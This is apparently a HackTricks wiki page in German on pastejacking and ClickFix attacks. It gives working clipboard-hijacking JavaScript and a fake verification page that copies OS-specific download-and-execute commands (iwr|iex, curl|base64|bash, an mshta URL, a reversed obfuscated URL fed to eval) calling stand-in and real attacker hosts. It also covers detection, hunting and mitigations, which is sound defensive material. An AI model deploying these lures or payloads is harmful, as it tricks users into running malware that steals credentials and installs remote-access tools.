# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Füge niemals etwas ein, das du nicht selbst kopiert hast." – alt, aber immer noch gültiger Rat

## Überblick

Clipboard hijacking – auch bekannt als *pastejacking* – nutzt aus, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu prüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) legt programmatisch von Angreifern kontrollierten Text in die Systemzwischenablage. Opfer werden in der Regel durch sorgfältig gestaltete Social-Engineering-Anweisungen dazu gebracht, **Win + R** (Run-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage einzufügen, wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Anhänge, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher beliebt in Phishing-Kampagnen, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer ausliefern.

## Erzwungene Copy-Buttons und versteckte Payloads (macOS one-liners)

Einige macOS infostealers klonen Installer-Seiten (z. B. Homebrew) und **erzwingen die Verwendung eines „Copy“-Buttons**, sodass Benutzer nicht nur den sichtbaren Text markieren können. Der Zwischenablageeintrag enthält den erwarteten Installer-Befehl plus eine angehängte Base64-Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziges Einfügen beides ausführt, während die UI die zusätzliche Stufe verbirgt.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere verlassen sich auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Der ClickFix / ClearFake Ablauf

1. Ein Nutzer besucht eine typosquatted oder kompromittierte Website (z. B. `docusign.sa[.]com`)
2. Injiziertes **ClearFake** JavaScript ruft eine Hilfsfunktion `unsecuredCopyToClipboard()` auf, die heimlich einen Base64-codierten PowerShell-One-Liner in die Zwischenablage speichert.
3. HTML-Anweisungen weisen das Opfer an: *“Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt zusätzliche Stufen, injiziert Shellcode und installiert Persistenz (z. B. geplante Aufgabe) – und führt letztlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispiel NetSupport RAT-Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binaries (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit einem rollierenden XOR-Schlüssel "https://google.com/", injiziert den finalen shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe**
2. Führt den JScript downloader innerhalb von **cscript.exe** aus
3. Ruft eine MSI-Payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` über `extrac32` und Dateikonkatentation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Zugangsdaten an `sumeriavgv.digital` exfiltriert.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen überspringen Dateidownloads vollständig und instruieren Opfer, einen Einzeiler einzufügen, der JavaScript über WSH abruft und ausführt, sich persistent macht und den C2 täglich rotiert. Beobachtete Beispielkette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hauptmerkmale
- Verschleierte URL wird zur Laufzeit umgedreht, um eine oberflächliche Inspektion zu vereiteln.
- JavaScript sorgt für Persistenz über eine Startup LNK (WScript/CScript) und wählt den C2 basierend auf dem aktuellen Tag – ermöglicht schnelle Domain-Rotation.

Minimaler JS-Ausschnitt, der verwendet wird, um C2s nach Datum zu wechseln:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Stufe setzt häufig einen Loader ein, der Persistenz herstellt und einen RAT (z. B. PureHVNC) nachlädt, oft dabei TLS an ein hardcodiertes Zertifikat pinned und den Traffic chunked.

Detection ideas specific to this variant
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Autostart‑Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript mit einem JS‑Pfad unter `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU und Kommandozeilen‑Telemetrie, die `.split('').reverse().join('')` oder `eval(a.responseText)` enthält.
- Wiederholt `powershell -NoProfile -NonInteractive -Command -` mit großen stdin‑Payloads, um lange Skripte ohne lange Kommandozeilen einzuspeisen.
- Geplante Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem updater‑artigen Task/Pfad (z. B. `\GoogleSystem\GoogleUpdater`) ausführen.

Threat hunting
- Täglich rotierende C2‑Hostnames und URLs mit `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`-Pattern.
- Korrelation von clipboard write events, gefolgt von Win+R paste und anschließend sofortiger `powershell.exe`-Ausführung.

Blue‑teams können Clipboard-, Prozess‑Erstellungs‑ und Registry‑Telemetrie kombinieren, um Pastejacking‑Missbrauch zu lokalisieren:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` behält eine Historie von **Win + R**-Befehlen – prüfen Sie ungewöhnliche Base64-/obfuskierte Einträge.
* Security Event ID **4688** (Process Creation), wo `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** für Datei‑Erstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern kurz vor dem verdächtigen 4688‑Event.
* EDR clipboard sensors (falls vorhanden) – korrelieren Sie `Clipboard Write`, gefolgt unmittelbar von einem neuen PowerShell‑Prozess.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen massenproduzieren gefälschte CDN/Browser‑Verifizierungsseiten ("Just a moment…", IUAM‑style), die Benutzer dazu zwingen, OS‑spezifische Befehle aus ihrer clipboard in native Konsolen zu kopieren. Dadurch wird die Ausführung aus der Browser‑Sandbox heraus verlagert und funktioniert sowohl unter Windows als auch macOS.

Key traits of the builder-generated pages
- OS‑Erkennung via `navigator.userAgent`, um Payloads anzupassen (Windows PowerShell/CMD vs. macOS Terminal). Optionale Decoys/No‑Ops für nicht unterstützte OS, um die Illusion aufrechtzuerhalten.
- Automatisches clipboard‑copy bei harmlosen UI‑Aktionen (Checkbox/Copy), während der sichtbare Text vom clipboard‑Inhalt abweichen kann.
- Mobile blocking und ein Popover mit Schritt‑für‑Schritt‑Anweisungen: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optionale Obfuskation und Single‑File‑Injector, um das DOM einer kompromittierten Site mit einer Tailwind‑gestylten Verifizierungs‑UI zu überschreiben (keine neue Domain‑Registrierung erforderlich).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-Persistenz beim initialen Start
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und sichtbare Artefakte reduziert werden.

In-place page takeover auf kompromittierten Seiten
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennungs- & hunting-Ideen speziell für IUAM‑artige Köder
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichung zwischen angezeigtem Text und Clipboard-Payload; `navigator.userAgent`-Branching; Tailwind + single-page replace in verdächtigen Kontexten.
- Windows-Endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; batch/MSI-Installer, ausgeführt aus `%TEMP%`.
- macOS-Endpoint: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` in zeitlichem Zusammenhang mit Browser-Ereignissen; Hintergrundprozesse, die das Schließen des Terminals überdauern.
- Korrelation von `RunMRU` (Win+R)-Historie und Clipboard-Writes mit anschließender Erstellung von Console-Prozessen.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Gegenmaßnahmen

1. Browser-Härtung – Zwischenablage-Schreibzugriff deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder eine Benutzeraktion erforderlich machen.
2. Sicherheitsbewusstsein – Nutzer darin schulen, sensible Befehle zu *tippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One-Liner zu blockieren.
4. Netzwerk-Kontrollen – ausgehende Anfragen zu bekannten pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** missbraucht oft denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referenzen

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
